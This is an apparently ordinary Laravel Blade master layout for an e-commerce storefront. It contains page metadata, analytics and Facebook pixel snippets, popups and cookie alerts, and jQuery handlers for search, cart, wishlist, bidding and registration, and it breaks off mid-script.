<!DOCTYPE html>

@php
    $rtl = get_session_language()->rtl;
@endphp

@if ($rtl == 1)
    <html dir="rtl" lang="{{ str_replace('_', '-', app()->getLocale()) }}">
@else
    <html lang="{{ str_replace('_', '-', app()->getLocale()) }}">
@endif

<head>

    <meta name="csrf-token" content="{{ csrf_token() }}">
    <meta name="app-url" content="{{ getBaseURL() }}">
    <meta name="file-base-url" content="{{ getFileBaseURL() }}">

    <title>@yield('meta_title', get_setting('website_name') . ' | ' . get_setting('site_motto'))</title>

    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="index, follow">
    <meta name="description" content="@yield('meta_description', get_setting('meta_description'))" />
    <meta name="keywords" content="@yield('meta_keywords', get_setting('meta_keywords'))">

    @yield('meta')

    @if (!isset($detailedProduct) && !isset($customer_product) && !isset($shop) && !isset($page) && !isset($blog))
        @php
            $meta_image = uploaded_asset(get_setting('meta_image'));
        @endphp
        <!-- Schema.org markup for Google+ -->
        <meta itemprop="name" content="{{ get_setting('meta_title') }}">
        <meta itemprop="description" content="{{ get_setting('meta_description') }}">
        <meta itemprop="image" content="{{ $meta_image }}">

        <!-- Twitter Card data -->
        <meta name="twitter:card" content="product">
        <meta name="twitter:site" content="@publisher_handle">
        <meta name="twitter:title" content="{{ get_setting('meta_title') }}">
        <meta name="twitter:description" content="{{ get_setting('meta_description') }}">
        <meta name="twitter:creator" content="@author_handle">
        <meta name="twitter:image" content="{{ $meta_image }}">

        <!-- Open Graph data -->
        <meta property="og:title" content="{{ get_setting('meta_title') }}" />
        <meta property="og:type" content="website" />
        <meta property="og:url" content="{{ route('home') }}" />
        <meta property="og:image" content="{{ $meta_image }}" />
        <meta property="og:description" content="{{ get_setting('meta_description') }}" />
        <meta property="og:site_name" content="{{ env('APP_NAME') }}" />
        <meta property="fb:app_id" content="{{ env('FACEBOOK_PIXEL_ID') }}">
    @endif

    <!-- Favicon -->
    @php
        $site_icon = uploaded_asset(get_setting('site_icon'));
    @endphp
    <link rel="icon" href="{{ $site_icon }}">
    <link rel="apple-touch-icon" href="{{ $site_icon }}">

    <!-- Google Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">

    <!-- CSS Files -->
    <link rel="stylesheet" href="{{ static_asset('assets/css/vendors.css') }}">
    @if ($rtl == 1)
        <link rel="stylesheet" href="{{ static_asset('assets/css/bootstrap-rtl.min.css') }}">
    @endif
    <link rel="stylesheet" href="{{ static_asset('assets/css/aiz-core.css?v=') }}{{ rand(1000, 9999) }}">
    <link rel="stylesheet" href="{{ static_asset('assets/css/custom-style.css') }}">


    <script>
        var AIZ = AIZ || {};
        AIZ.local = {
            nothing_selected: '{!! translate('Nothing selected', null, true) !!}',
            nothing_found: '{!! translate('Nothing found', null, true) !!}',
            choose_file: '{{ translate('Choose file') }}',
            file_selected: '{{ translate('File selected') }}',
            files_selected: '{{ translate('Files selected') }}',
            add_more_files: '{{ translate('Add more files') }}',
            adding_more_files: '{{ translate('Adding more files') }}',
            drop_files_here_paste_or: '{{ translate('Drop files here, paste or') }}',
            browse: '{{ translate('Browse') }}',
            upload_complete: '{{ translate('Upload complete') }}',
            upload_paused: '{{ translate('Upload paused') }}',
            resume_upload: '{{ translate('Resume upload') }}',
            pause_upload: '{{ translate('Pause upload') }}',
            retry_upload: '{{ translate('Retry upload') }}',
            cancel_upload: '{{ translate('Cancel upload') }}',
            uploading: '{{ translate('Uploading') }}',
            processing: '{{ translate('Processing') }}',
            complete: '{{ translate('Complete') }}',
            file: '{{ translate('File') }}',
            files: '{{ translate('Files') }}',
        }
    </script>

    <style>
        :root{
            --blue: #3490f3;
            --hov-blue: #2e7fd6;
            --soft-blue: rgba(0, 123, 255, 0.15);
            --secondary-base: {{ get_setting('secondary_base_color', '#ffc519') }};
            --hov-secondary-base: {{ get_setting('secondary_base_hov_color', '#dbaa17') }};
            --soft-secondary-base: {{ hex2rgba(get_setting('secondary_base_color', '#ffc519'), 0.15) }};
            --gray: #9d9da6;
            --gray-dark: #8d8d8d;
            --secondary: #919199;
            --soft-secondary: rgba(145, 145, 153, 0.15);
            --success: #85b567;
            --soft-success: rgba(133, 181, 103, 0.15);
            --warning: #f3af3d;
            --soft-warning: rgba(243, 175, 61, 0.15);
            --light: #f5f5f5;
            --soft-light: #dfdfe6;
            --soft-white: #b5b5bf;
            --dark: #292933;
            --soft-dark: #1b1b28;
            --primary: {{ get_setting('base_color', '#d43533') }};
            --hov-primary: {{ get_setting('base_hov_color', '#9d1b1a') }};
            --soft-primary: {{ hex2rgba(get_setting('base_color', '#d43533'), 0.15) }};
        }
        body{
            font-family: 'Public Sans', sans-serif;
            font-weight: 400;
        }

        .pagination .page-link,
        .page-item.disabled .page-link {
            min-width: 32px;
            min-height: 32px;
            line-height: 32px;
            text-align: center;
            padding: 0;
            border: 1px solid var(--soft-light);
            font-size: 0.875rem;
            border-radius: 0 !important;
            color: var(--dark);
        }
        .pagination .page-item {
            margin: 0 5px;
        }

        .form-control:focus {
            border-width: 2px !important;
        }
        .iti__flag-container {
            padding: 2px;
        }
        .modal-content {
            border: 0 !important;
            border-radius: 0 !important;
        }

        .tagify.tagify--focus{
            border-width: 2px;
            border-color: var(--primary);
        }

        #map{
            width: 100%;
            height: 250px;
        }
        #edit_map{
            width: 100%;
            height: 250px;
        }

        .pac-container { z-index: 100000; }
    </style>

@if (get_setting('google_analytics') == 1)
    <!-- Global site tag (gtag.js) - Google Analytics -->
    <script async src="https://www.googletagmanager.com/gtag/js?id={{ env('TRACKING_ID') }}"></script>

    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', '{{ env('TRACKING_ID') }}');
    </script>
@endif

@if (get_setting('facebook_pixel') == 1)
    <!-- Facebook Pixel Code -->
    <script>
        !function(f,b,e,v,n,t,s)
        {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
        n.callMethod.apply(n,arguments):n.queue.push(arguments)};
        if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
        n.queue=[];t=b.createElement(e);t.async=!0;
        t.src=v;s=b.getElementsByTagName(e)[0];
        s.parentNode.insertBefore(t,s)}(window, document,'script',
        'https://connect.facebook.net/en_US/fbevents.js');
        fbq('init', '{{ env('FACEBOOK_PIXEL_ID') }}');
        fbq('track', 'PageView');
    </script>
    <noscript>
        <img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id={{ env('FACEBOOK_PIXEL_ID') }}&ev=PageView&noscript=1"/>
    </noscript>
    <!-- End Facebook Pixel Code -->
@endif

@php
    echo get_setting('header_script');
@endphp

</head>
<body>
    <!-- aiz-main-wrapper -->
    <div class="aiz-main-wrapper d-flex flex-column bg-white">
        @php
            $user = auth()->user();
            $user_avatar = null;
            $carts = [];
            if ($user && $user->avatar_original != null) {
                $user_avatar = uploaded_asset($user->avatar_original);
            }

            $system_language = get_system_language();
        @endphp
        <!-- Header -->
        @include('frontend.inc.nav')

        @yield('content')

        <!-- footer -->
        @include('frontend.inc.footer')

    </div>

    @if(get_setting('use_floating_buttons') == 1)
        <!-- Floating Buttons -->
        @include('frontend.inc.floating_buttons')
    @endif

    <div class="aiz-refresh">
        <div class="aiz-refresh-content"><div></div><div></div><div></div></div>
    </div>


    @if (env("DEMO_MODE") == "On")
        <!-- demo nav -->
        @include('frontend.inc.demo_nav')
    @endif

    <!-- cookies agreement -->
    @php
        $alert_location = get_setting('custom_alert_location');
        $order = in_array($alert_location, ['top-left', 'top-right']) ? 'asc' : 'desc';
        $custom_alerts = App\Models\CustomAlert::where('status', 1)->orderBy('id', $order)->get();
    @endphp

    <div class="aiz-custom-alert {{ get_setting('custom_alert_location') }}">
        @foreach ($custom_alerts as $custom_alert)
            @if($custom_alert->id == 1)
                <div class="aiz-cookie-alert mb-3" style="box-shadow: 0px 6px 10px rgba(0, 0, 0, 0.24);">
                    <div class="p-3 px-lg-2rem rounded-0" style="background: {{ $custom_alert->background_color }};">
                        <div class="text-{{ $custom_alert->text_color }} mb-3">
                            {!! $custom_alert->description !!}
                        </div>
                        <button class="btn btn-block btn-primary rounded-0 aiz-cookie-accept">
                            {{ translate('Ok. I Understood') }}
                        </button>
                    </div>
                </div>
            @else
                <div class="mb-3 custom-alert-box removable-session d-none" data-key="custom-alert-box-{{ $custom_alert->id }}" data-value="removed" style="box-shadow: 0px 6px 10px rgba(0, 0, 0, 0.24);">
                    <div class="rounded-0 position-relative" style="background: {{ $custom_alert->background_color }};">
                        <a href="{{ $custom_alert->link }}" class="d-block h-100 w-100">
                            <div class="@if ($custom_alert->type == 'small') d-flex @endif">
                                <img class="@if ($custom_alert->type == 'small') h-140px w-120px img-fit @else w-100 @endif" src="{{ uploaded_asset($custom_alert->banner) }}" alt="custom_alert">
                                <div class="text-{{ $custom_alert->text_color }} p-2rem">
                                    {!! $custom_alert->description !!}
                                </div>
                            </div>
                        </a>
                        <button class="absolute-top-right bg-transparent btn btn-circle btn-icon d-flex align-items-center justify-content-center text-{{ $custom_alert->text_color }} hov-text-primary set-session" data-key="custom-alert-box-{{ $custom_alert->id }}" data-value="removed" data-toggle="remove-parent" data-parent=".custom-alert-box">
                            <i class="la la-close fs-20"></i>
                        </button>
                    </div>
                </div>
            @endif
        @endforeach
    </div>

    <!-- website popup -->
    @php
        $dynamic_popups = App\Models\DynamicPopup::where('status', 1)->orderBy('id', 'asc')->get();
    @endphp
    @foreach ($dynamic_popups as $key => $dynamic_popup)
        @if($dynamic_popup->id == 1)
            <div class="modal website-popup removable-session d-none" data-key="website-popup" data-value="removed">
                <div class="absolute-full bg-black opacity-60"></div>
                <div class="modal-dialog modal-dialog-centered modal-dialog-zoom modal-md mx-4 mx-md-auto">
                    <div class="modal-content position-relative border-0 rounded-0">
                        <div class="aiz-editor-data">
                            <div class="d-block">
                                <img class="w-100" src="{{ uploaded_asset($dynamic_popup->banner) }}" alt="dynamic_popup">
                            </div>
                        </div>
                        <div class="pb-5 pt-4 px-3 px-md-2rem">
                            <h1 class="fs-30 fw-700 text-dark">{{ $dynamic_popup->title }}</h1>
                            <p class="fs-14 fw-400 mt-3 mb-4">{{ $dynamic_popup->summary }}</p>
                            @if ($dynamic_popup->show_subscribe_form == 'on')
                                <form class="" method="POST" action="{{ route('subscribers.store') }}">
                                    @csrf
                                    <div class="form-group mb-0">
                                        <input type="email" class="form-control" placeholder="{{ translate('Your Email Address') }}" name="email" required>
                                    </div>
                                    <button type="submit" class="btn btn-block mt-3 rounded-0 text-{{ $dynamic_popup->btn_text_color }}" style="background: {{ $dynamic_popup->btn_background_color }};">
                                        {{ $dynamic_popup->btn_text }}
                                    </button>
                                </form>
                            @endif
                        </div>
                        <button class="absolute-top-right bg-white shadow-lg btn btn-circle btn-icon mr-n3 mt-n3 set-session" data-key="website-popup" data-value="removed" data-toggle="remove-parent" data-parent=".website-popup">
                            <i class="la la-close fs-20"></i>
                        </button>
                    </div>
                </div>
            </div>
        @else
            <div class="modal website-popup removable-session d-none" data-key="website-popup-{{ $dynamic_popup->id }}" data-value="removed">
                <div class="absolute-full bg-black opacity-60"></div>
                <div class="modal-dialog modal-dialog-centered modal-dialog-zoom modal-md mx-4 mx-md-auto">
                    <div class="modal-content position-relative border-0 rounded-0">
                        <div class="aiz-editor-data">
                            <div class="d-block">
                                <img class="w-100" src="{{ uploaded_asset($dynamic_popup->banner) }}" alt="dynamic_popup">
                            </div>
                        </div>
                        <div class="pb-5 pt-4 px-3 px-md-2rem">
                            <h1 class="fs-30 fw-700 text-dark">{{ $dynamic_popup->title }}</h1>
                            <p class="fs-14 fw-400 mt-3 mb-4">{{ $dynamic_popup->summary }}</p>
                            <a href="{{ $dynamic_popup->btn_link }}" class="btn btn-block mt-3 rounded-0 text-{{ $dynamic_popup->btn_text_color }}" style="background: {{ $dynamic_popup->btn_background_color }};">
                                {{ $dynamic_popup->btn_text }}
                            </a>
                        </div>
                        <button class="absolute-top-right bg-white shadow-lg btn btn-circle btn-icon mr-n3 mt-n3 set-session" data-key="website-popup-{{ $dynamic_popup->id }}" data-value="removed" data-toggle="remove-parent" data-parent=".website-popup">
                            <i class="la la-close fs-20"></i>
                        </button>
                    </div>
                </div>
            </div>
        @endif
    @endforeach

    @include('frontend.partials.modal')

    @include('frontend.partials.account_delete_modal')

    <div class="modal fade" id="addToCart">
        <div class="modal-dialog modal-lg modal-dialog-centered modal-dialog-zoom product-modal" id="modal-size" role="document">
            <div class="modal-content position-relative">
                <div class="c-preloader text-center p-3">
                    <i class="las la-spinner la-spin la-3x"></i>
                </div>
                <button type="button" class="close absolute-top-right btn-icon close z-1 btn-circle bg-gray mr-2 mt-2 d-flex justify-content-center align-items-center" data-dismiss="modal" aria-label="Close" style="background: #ededf2; width: calc(2rem + 2px); height: calc(2rem + 2px);">
                    <span aria-hidden="true" class="fs-24 fw-700" style="margin-left: 2px;">&times;</span>
                </button>
                <div id="addToCart-modal-body">

                </div>
            </div>
        </div>
    </div>

    @yield('modal')

    <!-- SCRIPTS -->
    <script src="{{ static_asset('assets/js/vendors.js') }}"></script>
    <script src="{{ static_asset('assets/js/aiz-core.js?v=') }}{{ rand(1000, 9999) }}"></script>



    @if (get_setting('facebook_chat') == 1)
        <script type="text/javascript">
            window.fbAsyncInit = function() {
                FB.init({
                  xfbml            : true,
                  version          : 'v3.3'
                });
              };

              (function(d, s, id) {
              var js, fjs = d.getElementsByTagName(s)[0];
              if (d.getElementById(id)) return;
              js = d.createElement(s); js.id = id;
              js.src = 'https://connect.facebook.net/en_US/sdk/xfbml.customerchat.js';
              fjs.parentNode.insertBefore(js, fjs);
            }(document, 'script', 'facebook-jssdk'));
        </script>
        <div id="fb-root"></div>
        <!-- Your customer chat code -->
        <div class="fb-customerchat"
          attribution=setup_tool
          page_id="{{ env('FACEBOOK_PAGE_ID') }}">
        </div>
    @endif

    <script>
        @foreach (session('flash_notification', collect())->toArray() as $message)
            AIZ.plugins.notify('{{ $message['level'] }}', '{{ $message['message'] }}');
        @endforeach
    </script>

    <script>
        @if (Route::currentRouteName() == 'home' || Route::currentRouteName() == '/')

            $.post('{{ route('home.section.featured') }}', {
                _token: '{{ csrf_token() }}'
            }, function(data) {
                $('#section_featured').html(data);
                AIZ.plugins.slickCarousel();
            });

            $.post('{{ route('home.section.todays_deal') }}', {
                _token: '{{ csrf_token() }}'
            }, function(data) {
                $('#todays_deal').html(data);
                AIZ.plugins.slickCarousel();
            });

            $.post('{{ route('home.section.best_selling') }}', {
                _token: '{{ csrf_token() }}'
            }, function(data) {
                $('#section_best_selling').html(data);
                AIZ.plugins.slickCarousel();
            });

            $.post('{{ route('home.section.newest_products') }}', {
                _token: '{{ csrf_token() }}'
            }, function(data) {
                $('#section_newest').html(data);
                AIZ.plugins.slickCarousel();
            });

            $.post('{{ route('home.section.auction_products') }}', {
                _token: '{{ csrf_token() }}'
            }, function(data) {
                $('#auction_products').html(data);
                AIZ.plugins.slickCarousel();
            });

            $.post('{{ route('home.section.preorder_products') }}', {
                _token: '{{ csrf_token() }}'
            }, function(data) {
                $('#section_featured_preorder_products').html(data);
                AIZ.plugins.slickCarousel();
            });

            $.post('{{ route('home.section.home_categories') }}', {
                _token: '{{ csrf_token() }}'
            }, function(data) {
                $('#section_home_categories').html(data);
                AIZ.plugins.slickCarousel();
            });

        @endif

        $(document).ready(function() {
            $('.category-nav-element').each(function(i, el) {

                $(el).on('mouseover', function(){
                    if(!$(el).find('.sub-cat-menu').hasClass('loaded')){
                        $.post('{{ route('category.elements') }}', {
                            _token: AIZ.data.csrf,
                            id:$(el).data('id'
                            )}, function(data){
                            $(el).find('.sub-cat-menu').addClass('loaded').html(data);
                        });
                    }
                });
            });

            if ($('#lang-change').length > 0) {
                $('#lang-change .dropdown-menu a').each(function() {
                    $(this).on('click', function(e){
                        e.preventDefault();
                        var $this = $(this);
                        var locale = $this.data('flag');
                        $.post('{{ route('language.change') }}',{_token: AIZ.data.csrf, locale:locale}, function(data){
                            location.reload();
                        });

                    });
                });
            }

            if ($('#currency-change').length > 0) {
                $('#currency-change .dropdown-menu a').each(function() {
                    $(this).on('click', function(e){
                        e.preventDefault();
                        var $this = $(this);
                        var currency_code = $this.data('currency');
                        $.post('{{ route('currency.change') }}',{_token: AIZ.data.csrf, currency_code:currency_code}, function(data){
                            location.reload();
                        });

                    });
                });
            }
        });

        $('#search').on('keyup', function(){
            search();
        });

        $('#search').on('focus', function(){
            search();
        });

        function search(){
            var searchKey = $('#search').val();
            if(searchKey.length > 0){
                $('body').addClass("typed-search-box-shown");

                $('.typed-search-box').removeClass('d-none');
                $('.search-preloader').removeClass('d-none');
                $.post('{{ route('search.ajax') }}', { _token: AIZ.data.csrf, search:searchKey}, function(data){
                    if(data == '0'){
                        // $('.typed-search-box').addClass('d-none');
                        $('#search-content').html(null);
                        $('.typed-search-box .search-nothing').removeClass('d-none').html('{{ translate('Sorry, nothing found for') }} <strong>"'+searchKey+'"</strong>');
                        $('.search-preloader').addClass('d-none');

                    }
                    else{
                        $('.typed-search-box .search-nothing').addClass('d-none').html(null);
                        $('#search-content').html(data);
                        $('.search-preloader').addClass('d-none');
                    }
                });
            }
            else {
                $('.typed-search-box').addClass('d-none');
                $('body').removeClass("typed-search-box-shown");
            }
        }

        $(".aiz-user-top-menu").on("mouseover", function (event) {
            $(".hover-user-top-menu").addClass('active');
        })
        .on("mouseout", function (event) {
            $(".hover-user-top-menu").removeClass('active');
        });

        $(document).on("click", function(event){
            var $trigger = $("#category-menu-bar");
            if($trigger !== event.target && !$trigger.has(event.target).length){
                $("#click-category-menu").slideUp("fast");;
                $("#category-menu-bar-icon").removeClass('show');
            }
        });

        function updateNavCart(view,count){
            $('.cart-count').html(count);
            $('#cart_items').html(view);
        }

        function removeFromCart(key){
            $.post('{{ route('cart.removeFromCart') }}', {
                _token  : AIZ.data.csrf,
                id      :  key
            }, function(data){
                updateNavCart(data.nav_cart_view,data.cart_count);
                $('#cart-details').html(data.cart_view);
                AIZ.plugins.notify('success', "{{ translate('Item has been removed from cart') }}");
                $('#cart_items_sidenav').html(parseInt($('#cart_items_sidenav').html())-1);
            });
        }

        function showLoginModal() {
            $('#loginModal').modal('show');
        }

        // Auto show login modal for guests
        // @guest
        //     document.addEventListener('DOMContentLoaded', function() {
        //         $('#login_modal').modal('show');
        //     });
        // @endguest

        function addToCompare(id){
            $.post('{{ route('compare.addToCompare') }}', {_token: AIZ.data.csrf, id:id}, function(data){
                $('#compare').html(data);
                AIZ.plugins.notify('success', "{{ translate('Item has been added to compare list') }}");
                $('#compare_items_sidenav').html(parseInt($('#compare_items_sidenav').html())+1);
            });
        }

        function addToWishList(id){
            @if (Auth::check() && Auth::user()->user_type == 'customer')
                $.post('{{ route('wishlists.store') }}', {_token: AIZ.data.csrf, id:id}, function(data){
                    if(data != 0){
                        $('#wishlist').html(data);
                        AIZ.plugins.notify('success', "{{ translate('Item has been added to wishlist') }}");
                    }
                    else{
                        AIZ.plugins.notify('warning', "{{ translate('Please login first') }}");
                    }
                });
            @elseif(Auth::check() && Auth::user()->user_type != 'customer')
                AIZ.plugins.notify('warning', "{{ translate('Please Login as a customer to add products to the WishList.') }}");
            @else
                AIZ.plugins.notify('warning', "{{ translate('Please login first') }}");
            @endif
        }

        function showAddToCartModal(id){
            if(!$('#modal-size').hasClass('modal-lg')){
                $('#modal-size').addClass('modal-lg');
            }
            $('#addToCart-modal-body').html(null);
            $('#addToCart').modal();
            $('.c-preloader').show();
            $.post('{{ route('cart.showCartModal') }}', {_token: AIZ.data.csrf, id:id}, function(data){
                $('.c-preloader').hide();
                $('#addToCart-modal-body').html(data);
                AIZ.plugins.slickCarousel();
                AIZ.plugins.zoom();
                AIZ.extra.plusMinus();
                getVariantPrice();
            });
        }

        $('#option-choice-form input').on('change', function(){
            getVariantPrice();
        });

        function getVariantPrice() {
            if($('#option-choice-form input[name=quantity]').val() > 0 && checkAddToCartValidity()) {
                $.ajax({
                    type: "POST",
                    url: '{{ route('products.variant_price') }}',
                    data: $('#option-choice-form').serializeArray(),
                    success: function(data) {
                        updateVariantPrice(data);
                    }
                });
            }
        }

        function updateVariantPrice(data) {
            $('#available-quantity').html(data.quantity);
            if (parseInt(data.in_stock) == 0 && data.digital == 0) {
                $('.buy-now').addClass('d-none');
                $('.add-to-cart').addClass('d-none');
                $('.out-of-stock').removeClass('d-none');
            } else {
                $('.buy-now').removeClass('d-none');
                $('.add-to-cart').removeClass('d-none');
                $('.out-of-stock').addClass('d-none');
            }
    
            const originalPrice = parseFloat(data.price);
            const formattedOriginalPrice = '{{ single_price(0) }}'.replace('0.00', originalPrice.toFixed(2));
            const formattedDiscountedPrice = data.discounted_price;
            const discount = parseFloat(data.discount);
            const discountType = data.discount_type;
            const discountPercentage = discountType === 'percent' ? discount : ((discount / originalPrice) * 100).toFixed(0);
    
            $('#variant-discounted-price').text(formattedDiscountedPrice);
            $('#discounted_price_input').val(formattedDiscountedPrice); // Update hidden input
            if (discount > 0) {
                $('#variant-original-price').text(formattedOriginalPrice).show();
                $('#variant-discount-percentage').text(`-${discountPercentage}%`).show();
            } else {
                $('#variant-original-price').hide();
                $('#variant-discount-percentage').hide();
            }
    
            $('#chosen_price').text(formattedDiscountedPrice);
            $('#chosen_price_div').removeClass('d-none');
    
            AIZ.extra.plusMinus();
        }

        function checkAddToCartValidity(){
            var names = {};
            $('#option-choice-form input:radio').each(function() { // find unique names
                names[$(this).attr('name')] = true;
            });
            var count = 0;
            $.each(names, function() { // then count them
                count++;
            });

            if($('#option-choice-form input:radio:checked').length == count){
                return true;
            }

            return false;
        }

        function addToCart() {
            if (checkAddToCartValidity()) {
                @if (Auth::check())
                    $.ajax({
                        type: "POST",
                        url: '{{ route('cart.addToCart') }}',
                        data: $('#option-choice-form').serializeArray(),
                        success: function(data) {
                            updateNavCart(data.nav_cart_view, data.cart_count);
                            AIZ.plugins.notify('success', "{{ translate('Item has been added to cart') }}");
                            setTimeout(function() {
                                $('.notification').fadeOut();
                            }, 3000);
                            if (data.status === 0) {
                                $('#addToCart-modal-body').html(data.modal_view);
                                $('#addToCart').modal('show');
                            }
                        },
                        error: function(xhr, status, error) {
                            AIZ.plugins.notify('error', "{{ translate('Unable to add item to cart') }}");
                        }
                    });
                @else
                    showLoginModal();
                @endif
            } else {
                AIZ.plugins.notify('warning', "{{ translate('Please select all required options') }}");
            }
        }
        
        function buyNow() {
            if (checkAddToCartValidity()) {
                @if (Auth::check())
                    $.ajax({
                        type: "POST",
                        url: '{{ route('cart.addToCart') }}',
                        data: $('#option-choice-form').serializeArray(),
                        success: function(data) {
                            updateNavCart(data.nav_cart_view, data.cart_count);
                            AIZ.plugins.notify('success', "{{ translate('Item has been added to cart') }}");
                            setTimeout(function() {
                                $('.notification').fadeOut();
                            }, 3000);
                            if (data.status === 1) {
                                window.location.href = "{{ route('cart') }}";
                            } else {
                                $('#addToCart-modal-body').html(data.modal_view);
                                $('#addToCart').modal('show');
                            }
                        },
                        error: function(xhr, status, error) {
                            AIZ.plugins.notify('error', "{{ translate('Unable to add item to cart') }}");
                        }
                    });
                @else
                    showLoginModal();
                @endif
            } else {
                AIZ.plugins.notify('warning', "{{ translate('Please select all required options') }}");
            }
        }

        function bid_single_modal(bid_product_id, min_bid_amount){
            @if (Auth::check() && (isCustomer() || isSeller()))
                var min_bid_amount_text = "({{ translate('Min Bid Amount: ') }}"+min_bid_amount+")";
                $('#min_bid_amount').text(min_bid_amount_text);
                $('#bid_product_id').val(bid_product_id);
                $('#bid_amount').attr('min', min_bid_amount);
                $('#bid_for_product').modal('show');
            @elseif (Auth::check() && isAdmin())
                AIZ.plugins.notify('warning', '{{ translate('Sorry, Only customers & Sellers can Bid.') }}');
            @else
                $('#login_modal').modal('show');
            @endif
        }

        function clickToSlide(btn,id){
            $('#'+id+' .aiz-carousel').find('.'+btn).trigger('click');
            $('#'+id+' .slide-arrow').removeClass('link-disable');
            var arrow = btn=='slick-prev' ? 'arrow-prev' : 'arrow-next';
            if ($('#'+id+' .aiz-carousel').find('.'+btn).hasClass('slick-disabled')) {
                $('#'+id).find('.'+arrow).addClass('link-disable');
            }
        }

        function goToView(params) {
            document.getElementById(params).scrollIntoView({behavior: "smooth", block: "center"});
        }

        function copyCouponCode(code){
            navigator.clipboard.writeText(code);
            AIZ.plugins.notify('success', "{{ translate('Coupon Code Copied') }}");
        }

        $(document).ready(function(){
            $('.cart-animate').animate({margin : 0}, "slow");

            $({deg: 0}).animate({deg: 360}, {
                duration: 2000,
                step: function(now) {
                    $('.cart-rotate').css({
                        transform: 'rotate(' + now + 'deg)'
                    });
                }
            });

            setTimeout(function(){
                $('.cart-ok').css({ fill: '#d43533' });
            }, 2000);

        });

        function nonLinkableNotificationRead(){
            $.get('{{ route('non-linkable-notification-read') }}',function(data){
                $('.unread-notification-count').html(data);
            });
        }
    </script>


    <script type="text/javascript">
        if ($('input[name=country_code]').length > 0){
            // Country Code
            var isPhoneShown = true,
                countryData = window.intlTelInputGlobals.getCountryData(),
                input = document.querySelector("#phone-code");

            for (var i = 0; i < countryData.length; i++) {
                var country = countryData[i];
                if (country.iso2 == 'bd') {
                    country.dialCode = '88';
                }
            }

            var iti = intlTelInput(input, {
                separateDialCode: true,
                utilsScript: "{{ static_asset('assets/js/intlTelutils.js') }}?1590403638580",
                onlyCountries: @php echo get_active_countries()->pluck('code') @endphp,
                customPlaceholder: function(selectedCountryPlaceholder, selectedCountryData) {
                    if (selectedCountryData.iso2 == 'bd') {
                        return "01xxxxxxxxx";
                    }
                    return selectedCountryPlaceholder;
                }
            });

            var country = iti.getSelectedCountryData();
            $('input[name=country_code]').val(country.dialCode);

            input.addEventListener("countrychange", function(e) {
                // var currentMask = e.currentTarget.placeholder;
                var country = iti.getSelectedCountryData();
                $('input[name=country_code]').val(country.dialCode);

            });

            function toggleEmailPhone(el) {
                if (isPhoneShown) {
                    $('.phone-form-group').addClass('d-none');
                    $('.email-form-group').removeClass('d-none');
                    $('input[name=phone]').val(null);
                    isPhoneShown = false;
                    $(el).html('*{{ translate('Use Phone Number Instead') }}');
                } else {
                    $('.phone-form-group').removeClass('d-none');
                    $('.email-form-group').addClass('d-none');
                    $('input[name=email]').val(null);
                    isPhoneShown = true;
                    $(el).html('<i>*{{ translate('Use Email Instead') }}</i>');
                }
            }
        }
    </script>

    <script>
        var acc = document.getElementsByClassName("aiz-accordion-heading");
        var i;
        for (i = 0; i < acc.length; i++) {
            acc[i].addEventListener("click", function() {
                this.classList.toggle("active");
                var panel = this.nextElementSibling;
                if (panel.style.maxHeight) {
                    panel.style.maxHeight = null;
                } else {
                    panel.style.maxHeight = panel.scrollHeight + "px";
                }
            });
        }
    </script>

    <script>
        function showFloatingButtons() {
            document.querySelector('.floating-buttons-section').classList.toggle('show');;
        }
    </script>

    @if (env("DEMO_MODE") == "On")
        <script>
            var demoNav = document.querySelector('.aiz-demo-nav');
            var menuBtn = document.querySelector('.aiz-demo-nav-toggler');
            var lineOne = document.querySelector('.aiz-demo-nav-toggler .aiz-demo-nav-btn .line--1');
            var lineTwo = document.querySelector('.aiz-demo-nav-toggler .aiz-demo-nav-btn .line--2');
            var lineThree = document.querySelector('.aiz-demo-nav-toggler .aiz-demo-nav-btn .line--3');
            menuBtn.addEventListener('click', () => {
                toggleDemoNav();
            });

            function toggleDemoNav() {
                // demoNav.classList.toggle('show');
                demoNav.classList.toggle('shadow-none');
                lineOne.classList.toggle('line-cross');
                lineTwo.classList.toggle('line-fade-out');
                lineThree.classList.toggle('line-cross');
                if ($('.aiz-demo-nav-toggler').hasClass('show')) {
                    $('.aiz-demo-nav-toggler').removeClass('show');
                    demoHideOverlay();
                }else{
                    $('.aiz-demo-nav-toggler').addClass('show');
                    demoShowOverlay();
                }
            }

            $('.aiz-demos').click(function(e){
                if (!e.target.closest('.aiz-demos .aiz-demo-content')) {
                    toggleDemoNav();
                }
            });

            function demoShowOverlay(){
                $('.top-banner').removeClass('z-1035').addClass('z-1');
                $('.top-navbar').removeClass('z-1035').addClass('z-1');
                $('header').removeClass('z-1020').addClass('z-1');
                $('.aiz-demos').addClass('show');
            }

            function demoHideOverlay(cls=null){
                if($('.aiz-demos').hasClass('show')){
                    $('.aiz-demos').removeClass('show');
                    $('.top-banner').delay(800).removeClass('z-1').addClass('z-1035');
                    $('.top-navbar').delay(800).removeClass('z-1').addClass('z-1035');
                    $('header').delay(800).removeClass('z-1').addClass('z-1020');
                }
            }
        </script>
    @endif

    @yield('script')

    @php
        echo get_setting('footer_script');
    @endphp
    
    <script type="text/javascript">
        $(document).ready(function() {
            // User type selection handling
            $('#customer').prop('checked', true);
            $('#org_seller, #org_seller2').hide();
            $('#photo-label').text('Upload Photo');
    
            $("#customer, #seller, #wholeseller").on('change', function(){
                let userType = $(this).val();
                if (userType === 'seller' || userType === 'wholeseller') {
                    $('#org_seller, #org_seller2').show();
                    $('#photo-label').text('Upload License');
                    if (userType === 'seller') {
                        $('#pan_card_group').show();
                        $('#pan_card').prop('required', true);
                        console.log("Showing PAN card for seller");
                    } else {
                        $('#pan_card_group').hide();
                        $('#pan_card').prop('required', false);
                        console.log("Hiding PAN card for wholeseller");
                    }
                } else {
                    $('#org_seller, #org_seller2').hide();
                    $('#pan_card_group').hide();
                    $('#pan_card').prop('required', false);
                    $('#photo-label').text('Upload Photo');
                    console.log("Hiding PAN card for customer");
                }
